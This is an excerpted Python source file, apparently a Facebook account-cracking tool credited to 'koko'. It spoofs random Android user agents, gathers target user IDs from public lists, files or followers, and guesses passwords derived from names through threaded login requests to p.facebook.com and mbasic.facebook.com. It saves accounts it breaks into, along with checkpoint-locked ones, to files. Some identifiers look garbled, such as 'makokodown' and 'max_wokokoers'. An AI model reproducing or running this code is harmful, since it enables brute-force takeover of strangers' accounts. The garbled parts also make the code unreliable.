...
from rich.makokodown import Makokodown as makoko
...
if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print("    "+ 'WARING⛔ THE TOOL CODEING BY koko CODER 404\nTOOL EXPIERE BRO⛔\nBO KRINI TOOL NAMA BNERA BO @koko_709')
 print('\n\n')
 print(x)
...
for xd in range(2000):
    ...
    rr = random.randrange
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android {str(rr(4,11))}; Nokia 1000 LTE Build/Gkoko39F) AppleWebKit/536.27 (KHTML, like Gecko)  Chrome/ {str(rr(73,99))}.0.{str(rr(3500,4900))}.{str(rr(75,150))} Mobile Safari/533.7"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(4,11))}; Nokia 1100 4G Build/Gkoko39F) AppleWebKit/537.18 (KHTML, like Gecko)  Chrome/ {str(rr(75,150))}.0.{str(rr(2111,2999))}.{str(rr(73,99))} Mobile Safari/534.8"
    tiga  = f"Mozilla/5.0 (Linux; Android {str(rr(5,12))}; Nokia 1100 LTE Build/Gkoko39F) AppleWebKit/600.15 (KHTML, like Gecko)  Chrome/{str(rr(75,150))}.0.{str(rr(2111,2999))}.{str(rr(73,99))} Mobile Safari/602.9"
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/koko001/koko-5/blob/main/mr.txt').text
		ua=open('.mr.txt','w')
...
#		gep = requests.get('http://ipinfo.io/json').json()
	...
	koko = input('%s[%s?%s]%s select menu %s : '%(N,H,N,H,M))
	if koko in ['1','01']:
		public()
	if koko in ['2','02']:
		FILES()
...
def follower():
	try:
		...
		exit()
	print('\n\x1b[1;30m%s[%skoko%s]%s-----%s[%skoko%s]\n '%(H,P,H,P,H,P,H,))
	pil = input('[koko]  Inter User Id : ')
	try:
...
def su():
	...
	print(f'''
	\033[1;41m\033[1;97mTOOL koko\033[1;0m
...
def passwrd():
	...
	print("")
	with tred(max_wokokoers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				pool.submit(crackmobile_koko,idf,pwv,nmf)
			elif 'mbasic' in method:
				pool.submit(crackmbasic_koko,idf,pwv,nmf)
			else:
...
def password3():
	...
	print("\033[1;31m➣ \033[1;37m TOTAL ID : "+str(len(id)))
	print("")
	with tred(max_wokokoers=20) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
...
# Mobile 
def crackmobile_koko(idf,pwv,nmf):
    global loop,ok,cp
    ...
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'dakoko',
    ...
    loop+=1
#------------------[ METHODE-MBASIC-2 ]-------------------#
def crackmbasic_koko(idf,pwv,nmf):
	global loop,ok,cp
	sys.stdout.write(f"\r[ [VIP] [koko]{P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}--{ok}-{P}]—{P}[{k}--{cp}-{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			ses.headers.update({"Host":"p.facebook.com",'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"makoko.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
...
def ceker(idf,pw):
	...
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "makoko.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		...
		print('\r%s[koko]%s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s[koko]---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s[koko]---> %s%s'%(kk,opsii.text,x))
...
def cek_opsi():
	...
	sol().print(makoko(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				...
				time.sleep(2)
				print('\r%s[koko]%s ----> Error      %s'%(b,kes,x))
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					print('\r%s[koko]%s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s[koko]--> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
				...
				print('\r%s[koko]%s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s[koko]%s|%s ----> ID       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(makoko(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(makoko(dah, style='green'))
	exit()
#----------------------[ CEK-APLIKASI ]---------------------#
def cek_koko(kuki):
...
def reg():
    ...
    time.sleep(1) 
    try:
        to = open('/sdcard/Android/.koko.txt', 'r').read()
    except (KeyError, IOError):
        reg2()
    r = requests.get('https://raw.githubusercontent.com/koko001/approval.txt/main/koko').text
    if to in r:
        time.sleep(1)
        login()
    else:
